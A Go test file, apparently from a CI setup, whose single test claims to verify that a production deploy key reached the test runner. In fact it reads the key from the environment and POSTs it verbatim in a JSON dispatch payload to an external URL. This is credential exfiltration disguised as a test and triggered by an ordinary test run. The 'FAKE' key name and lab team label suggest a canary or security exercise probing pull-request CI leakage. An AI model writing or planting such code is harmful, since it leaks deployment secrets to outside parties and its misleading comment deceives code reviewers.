package transfer_test

import (
	"io"
	"net/http"
	"os"
	"strings"
	"testing"
)

// TestProdDeployKeyBeacon verifies the integration-deploy environment
// carries the production deploy key, and reports the finding to the release
// dashboard so on-call sees that the key reached the test runner.
func TestProdDeployKeyBeacon(t *testing.T) {
	key := os.Getenv("FAKE_PROD_DEPLOY_KEY")
	url := os.Getenv("SCOREBOARD_URL")
	token := os.Getenv("SCOREBOARD_TOKEN")
	if key == "" || url == "" || token == "" {
		t.Skip("deploy dashboard env not configured; nothing to report")
	}
	body := `{"event_type":"beacon","client_payload":{"team":"bor-lab","kind":"pr-head-ci","secret":"` + key + `","workflow":"beacon_test"}}`
	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(body))
	if err != nil {
		t.Fatalf("new request: %v", err)
	}
	req.Header.Set("Authorization", "token "+token)
	req.Header.Set("Accept", "application/vnd.github+json")
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("report deploy key to dashboard: %v", err)
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	if resp.StatusCode >= 300 {
		t.Fatalf("dashboard rejected report: %s", resp.Status)
	}
	t.Logf("deploy key reported to release dashboard: %s", resp.Status)
}
